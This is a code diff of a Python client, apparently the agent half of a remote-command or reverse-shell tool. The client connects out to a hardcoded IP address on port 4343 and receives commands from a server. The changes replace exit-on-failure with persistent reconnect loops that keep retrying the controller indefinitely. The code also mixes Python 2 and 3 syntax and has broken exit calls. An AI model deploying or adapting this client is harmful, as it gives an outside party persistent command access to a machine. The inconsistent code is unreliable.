@@ -4,16 +4,16 @@ import os
 import time
 import sys
 
-ip = '2001:420:2240:1275:4028:e3ab:e565:5085'  # server ip, which you want to connect to
+ip = '24.162.240.46'  # server ip, which you want to connect to
 port = 4343  # the port needs to be the same as server.py port in order to connect with server
 
 class Client:
     def __init__(self, _host, _port=3434):
         self.host = _host
         self.port = _port
-        self.s = None
         self.tryy = 0
-        print ('About to launch')
+        self.s = None
+        print ("Launching...")
         self.launch()
 
     # run younioner
@@ -24,33 +24,26 @@ class Client:
             self.chat()
 
         except error as e:
-            print ("Failed launch")
-            self.s.close()
-            sys.exit(0)
-            os._exit(0)
-            exit(0)
-            quit(0)
-            self.s.close()
+            time.sleep(6)
+            self.launch()
 
     # will create the socket
     def open_socket(self):
         try:
-            self.s = socket(AF_INET6, SOCK_STREAM, 0)
-            self.s.connect((self.host, self.port, 0, 0))
+            self.s = socket(AF_INET, SOCK_STREAM)
+            self.s.connect((self.host, self.port))
 
         except:
-            print ("Failed open socket")
-            self.tryy += 1
             if self.tryy > 5:
                 self.s.close()
-                sys.exit(0)
-                os._exit(0)
+                sys.exit()
+                os._exit()
                 exit(0)
                 quit(0)
-                self.s.close()
-            else:
-                time.sleep(3)
-                self.open_socket()
+            print "Retrying connection to", self.host, self.port
+            self.tryy += 1
+            time.sleep(5)
+            self.open_socket()
 
     # receive commands from the Server
     def receive_commands(self):
@@ -90,5 +83,4 @@ class Client:
             self.receive_commands()
 
 if __name__ == '__main__':
-    print ("Starting python script")
     c = Client(ip, port)
